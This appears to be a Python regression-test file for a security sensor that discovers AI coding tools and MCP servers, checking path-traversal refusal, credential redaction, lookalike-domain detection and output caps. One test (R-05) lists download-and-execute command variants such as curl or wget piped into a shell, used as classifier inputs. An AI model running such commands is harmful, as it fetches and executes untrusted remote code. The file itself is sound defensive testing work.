"""Group R - hardening regressions.

One case per finding from the adversarial review. These sit outside the four
discovery targets in Appendix A on purpose: they check that the collector
behaves under an input designed to fool it, not that it finds the four things
it exists to find.
"""


from .cases_tools import count, none_of
from .framework import World, assets, has

CASES = {}


def case(case_id):
    def register(fn):
        CASES[case_id] = fn
        return fn
    return register


@case("R-01")
def r01():
    """A permitted path that symlinks into a denied one."""
    w = World()
    w.json("/Users/alice/Documents/private.json",
           {"mcpServers": {"CANARY-secret": {"command": "node", "args": ["x.js"]}}})
    w.raw_link("/Users/alice/.claude.json",
               str(w._real("/Users/alice/Documents/private.json")))
    return w, [none_of(kind="mcp_server"),
               has("nothing from the denied target leaks",
                   lambda s: "CANARY-secret" not in s.to_json()),
               has("the refusal is recorded rather than silent",
                   lambda s: any("denied" in e.get("message", "") for e in s.errors))]


@case("R-02")
def r02():
    """A relative segment that climbs out of the tree we were pointed at."""
    w = World()
    canary = w.root.parent / "adr-r02-canary.txt"
    canary.write_text("ESCAPED-CANARY")
    env = w.env()
    reads = [env.read("/opt/lib/pkg/" + "../" * hops + "adr-r02-canary.txt")
             for hops in range(2, 9)]
    canary.unlink()
    return w, [has("no traversal reads outside the root",
                   lambda s: not any(r and "ESCAPED-CANARY" in r.text for r in reads)),
               has("each refusal names the reason",
                   lambda s: all((not r) for r in reads))]


@case("R-03")
def r03():
    """A bridge observation must not unite two different tools."""
    from adr_sensor.discovery.base_probe import Observation
    from adr_sensor.discovery.resolver import resolve

    shared = "/usr/local/lib/shared-wrapper"
    observations = [
        Observation(probe="p", channel="filesystem", kind="cli_agent", name="aider",
                    path="/usr/local/bin/aider", matched_on="binary:aider",
                    catalog_id="aider", realpath=shared, owner="alice"),
        Observation(probe="p", channel="filesystem", kind="cli_agent", name="bridge",
                    path="/usr/local/bin/bridge", matched_on="binary:bridge",
                    realpath=shared, pkg_identity="npm:@block/goose-cli", owner="alice"),
        Observation(probe="p", channel="package_registry", kind="cli_agent", name="goose",
                    path="/pkg/goose", matched_on="npm:@block/goose-cli", catalog_id="goose",
                    pkg_identity="npm:@block/goose-cli", owner="alice"),
    ]
    resolved = resolve(observations)
    w = World()
    return w, [has("both tools survive the merge",
                   lambda s: {a.catalog_id for a in resolved} >= {"aider", "goose"}),
               has("neither tool absorbs the other's evidence",
                   lambda s: all(len({e.matched_on for e in a.evidence}
                                     & {"binary:aider", "npm:@block/goose-cli"}) <= 1
                                 for a in resolved if a.catalog_id))]


@case("R-04")
def r04():
    """Production collects listening sockets, not an empty list."""
    from adr_sensor.discovery.runner import _live_sockets, live_env
    w = World()
    return w, [has("live_env wires a socket collector",
                   lambda s: isinstance(live_env().sockets, (list, tuple))),
               has("the collector returns real listeners on this host",
                   lambda s: isinstance(_live_sockets(), tuple))]


@case("R-05")
def r05():
    """Download-and-execute, in the spellings it actually takes."""
    from adr_sensor.discovery.probes.mcp import classify_launch
    variants = ["CURL https://x | sh",
                "curl -fsSL https://x | env bash",
                "wget https://x -O- | /bin/bash",
                'powershell -Command "iwr https://x | iex"',
                "curl https://x | python3 -",
                "fetch https://x | zsh"]
    missed = [v for v in variants
              if "remote_code_execution" not in classify_launch("bash", ["-c", v], "")[1]]
    benign = classify_launch("node", ["server.js", "--pipe", "|"], "")[1]
    w = World()
    return w, [has("every variant is classified", lambda s: not missed or "missed: %s" % missed),
               has("an ordinary launch is not",
                   lambda s: "remote_code_execution" not in benign)]


@case("R-06")
def r06():
    """The live process table is scoped to this user, not merely described as such."""
    import getpass

    from adr_sensor.discovery.runner import _live_processes
    processes = _live_processes()
    try:
        me = getpass.getuser()
    except Exception:
        me = ""
    w = World()
    return w, [has("no other user's processes are collected",
                   lambda s: all(p.user == me for p in processes) if processes else True)]


@case("R-07")
def r07():
    """Credentials with no vendor marking are still credentials."""
    from adr_sensor.discovery.redact import redact_argv, redact_secretish
    jwt = "eyJhbGciOiJIUzI1NiJ9.eyJzdWIiOiJhbGljZSJ9.s5Zq2Xk9pQwErTyUiOpAsDfGhJkLzXcVbNm"
    argv = redact_argv(["agent", "--auth-token", jwt, "--session-key=CANARYKEY12345678",
                        "--dangerously-skip-permissions", "--port", "8080"])
    pem = redact_secretish("-----BEGIN RSA PRIVATE KEY----- MIIEow")
    w = World()
    return w, [has("a JWT never survives", lambda s: jwt not in " ".join(argv)),
               has("an uncatalogued credential flag is redacted by its name",
                   lambda s: "CANARYKEY12345678" not in " ".join(argv)),
               has("a PEM header is masked", lambda s: "BEGIN RSA PRIVATE KEY" not in pem),
               has("risk-bearing flags survive",
                   lambda s: "--dangerously-skip-permissions" in argv and "8080" in argv)]


@case("R-08")
def r08():
    """A cap applies wherever servers come from, and says so when it fires."""
    w = World()
    w.json("~/dev/payments/.mcp.json",
           {"mcpServers": {"s%d" % i: {"command": "node", "args": ["%d.js" % i]}
                           for i in range(600)}})
    return w, [count(500, kind="mcp_server"),
               has("the cap is reported with the true count",
                   lambda s: any(entry["declared"] == 600
                                 for entry in s.stats["coverage"].get("capped", []))),
               has("an error names the capped file",
                   lambda s: any("capped" in e.get("message", "") for e in s.errors))]


@case("R-09")
def r09():
    """A walk ceiling that fires is recorded, not silent."""
    from adr_sensor.discovery import env as env_mod
    w = World()
    for index in range(30):
        w.file("/Users/alice/dev/wide/f%d.txt" % index, "x")
    env = w.env()
    original = env_mod.MAX_WALK_ENTRIES
    env_mod.MAX_WALK_ENTRIES = 10
    try:
        list(env.walk("/Users/alice/dev", max_depth=3))
    finally:
        env_mod.MAX_WALK_ENTRIES = original
    return w, [has("truncation is in the error log",
                   lambda s: any("walk truncated" in e.get("message", "") for e in env.errors)),
               has("and in coverage",
                   lambda s: bool(env.coverage.get("truncated_walks")))]


@case("R-10")
def r10():
    """Subprocess output is bounded as well as timed."""
    from adr_sensor.discovery.runner import MAX_SUBPROCESS_BYTES, _subprocess_runner
    code, out = _subprocess_runner(
        ["python3", "-c", "print('x' * 5_000_000)"], 10.0)
    w = World()
    return w, [has("output is capped",
                   lambda s: len(out) <= MAX_SUBPROCESS_BYTES + 64),
               has("truncation is stated in the output",
                   lambda s: "truncated" in out)]


@case("R-11")
def r11():
    """A lookalike domain is not a corporate domain."""
    w = World(policy={"corporate_domains": ["corp.example"]})
    w.json("~/.claude.json", {"mcpServers": {
        "evil": {"url": "https://mcp.evilcorp.example/v1"},
        "inside": {"url": "https://mcp.corp.example/v1"},
        "deep": {"url": "https://a.b.corp.example/v1"}}})
    def factors(snapshot, name):
        return [a for a in assets(snapshot, kind="mcp_server")
                if a.name == name][0].risk["factors"]
    return w, [has("the lookalike is third party",
                   lambda s: "third_party_remote" in factors(s, "evil")),
               has("the real domain and its subdomain are not",
                   lambda s: "third_party_remote" not in factors(s, "inside")
                   and "third_party_remote" not in factors(s, "deep"))]


@case("R-12")
def r12():
    """A provider host is a host, not a substring."""
    from adr_sensor.discovery.probes.openworld import OpenWorldProbe
    probe = OpenWorldProbe()
    w = World()
    return w, [has("a lookalike host does not match",
                   lambda s: not probe._is_provider_target("https://api.openai.com.evil.test/*")),
               has("a path segment does not match",
                   lambda s: not probe._is_provider_target("https://evil.test/api.openai.com/x")),
               has("the real host still matches",
                   lambda s: probe._is_provider_target("https://api.openai.com/*"))]


@case("R-13")
def r13():
    """A nix upgrade is a version change, not a reinstall."""
    from adr_sensor.discovery.paths import install_root
    before = install_root("/nix/store/abc123-claude-code-2.1.234/bin/claude")
    after = install_root("/nix/store/def456-claude-code-2.1.235/bin/claude")
    w = World()
    return w, [has("identity survives the upgrade",
                   lambda s: before == after == "nix:claude-code"),
               has("a versionless store path is unchanged",
                   lambda s: install_root("/nix/store/abc-crush/bin/crush") == "nix:crush")]


@case("R-14")
def r14():
    """A file sitting exactly on the ceiling is whole, not truncated."""
    w = World()
    w.file("/exact.txt", "y" * 1000)
    w.file("/over.txt", "y" * 1001)
    env = w.env()
    exact = env.read("/exact.txt", limit=1000)
    over = env.read("/over.txt", limit=1000)
    return w, [has("exact-size read is not flagged",
                   lambda s: exact.truncated is False and len(exact.data) == 1000),
               has("one byte more is flagged",
                   lambda s: over.truncated is True and len(over.data) == 1000)]


@case("R-15")
def r15():
    """Snapshot deltas, which the appendix no longer specifies but the code emits."""
    from adr_sensor.discovery import diff_snapshots
    w = World().path("/opt/homebrew/bin")
    w.file("/opt/homebrew/bin/claude")
    w.run("--version", "claude 1.2.0")
    first = w.scan()
    w2 = World().path("/opt/homebrew/bin")
    w2.file("/opt/homebrew/bin/claude")
    w2.run("--version", "claude 1.3.0")
    second = w2.scan()
    changes = diff_snapshots(first, second)
    w2.cleanup()
    return w, [has("a rescan of the same world is empty",
                   lambda s: diff_snapshots(first, first) == []),
               has("a version bump keeps the asset id",
                   lambda s: len(changes) == 1 and changes[0]["change"] == "version_changed"),
               has("the delta is its own inverse",
                   lambda s: {c["change"] for c in diff_snapshots(second, first)}
                   == {"version_changed"})]


@case("R-16")
def r16():
    """Fleet fan-out is one finding, not one per endpoint."""
    from adr_sensor.discovery import fleet_drift
    appeared = [("host%d" % index,
                 [{"change": "appeared", "asset_id": "abc123", "name": "mcp-new",
                   "risk": {"factors": ["unpinned_supply_chain"]}}])
                for index in range(40)]
    findings = fleet_drift(appeared, min_hosts=10)
    w = World()
    return w, [has("exactly one fleet finding", lambda s: len(findings) == 1),
               has("host count and severity carried",
                   lambda s: findings[0]["host_count"] == 40 and findings[0]["severity"] == "high"),
               has("a handful of hosts is not a fan-out",
                   lambda s: fleet_drift(appeared[:5], min_hosts=10) == [])]


@case("R-17")
def r17():
    """Listeners are probed concurrently, so a stalled port costs one timeout."""
    import time

    w = World()
    for port in range(9000, 9012):
        w.sock(port)

    def slow_http(port, endpoint):
        time.sleep(0.15)
        return None

    w._http_get = slow_http
    env = w.env()
    from adr_sensor.discovery.probes.runtime import RuntimeProbe
    started = time.time()
    RuntimeProbe().run(env)
    elapsed = time.time() - started
    serial = 12 * 2 * 0.15
    return w, [has("twelve listeners cost far less than a serial sweep",
                   lambda s: elapsed < serial / 3 or "%.2fs vs %.2fs serial" % (elapsed, serial))]


@case("R-18")
def r18():
    """An outright denied path is refused quietly; a bypass is not."""
    w = World()
    w.dir("/Users/alice/.ssh")
    w.file("/Users/alice/Documents/notes.md", "x")
    env = w.env()
    env.is_dir("/Users/alice/.ssh")
    env.read("/Users/alice/Documents/notes.md")
    quiet = list(env.errors)
    w.raw_link("/Users/alice/.claude.json", str(w._real("/Users/alice/Documents/notes.md")))
    env.read("/Users/alice/.claude.json")
    return w, [has("enumerating a denied path records nothing",
                   lambda s: quiet == [] or quiet),
               has("a permitted path resolving into one is recorded",
                   lambda s: any("denied" in e.get("message", "") for e in env.errors))]
